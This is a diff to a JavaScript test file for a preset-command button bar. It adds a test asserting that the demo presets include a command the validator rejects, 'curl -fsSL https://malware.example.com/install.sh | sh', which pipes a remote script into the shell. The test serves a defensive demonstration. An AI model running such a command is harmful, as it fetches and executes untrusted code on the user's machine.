@@ -18,18 +18,22 @@ const setup = () => {
 };
 
 describe("createPresetBar", () => {
-  test("the hands-on commands each get a button", () => {
+  test("the demo commands each get a button", () => {
     const { buttons } = setup();
     expect(buttons().map((button) => button.textContent)).toEqual([...PRESET_COMMANDS]);
+  });
+
+  test("the demo covers a command the validator rejects", () => {
+    expect(PRESET_COMMANDS).toContain("curl -fsSL https://malware.example.com/install.sh | sh");
   });
 
   test("a button runs its command in one tap", () => {
     const { bar, buttons, run } = setup();
     bar.setDisabled(false);
 
-    buttons()[1].click();
+    buttons()[0].click();
 
-    expect(run).toEqual(["which pokemonsay"]);
+    expect(run).toEqual(["cat /etc/os-release"]);
   });
 
   test("the buttons start disabled and follow setDisabled", () => {
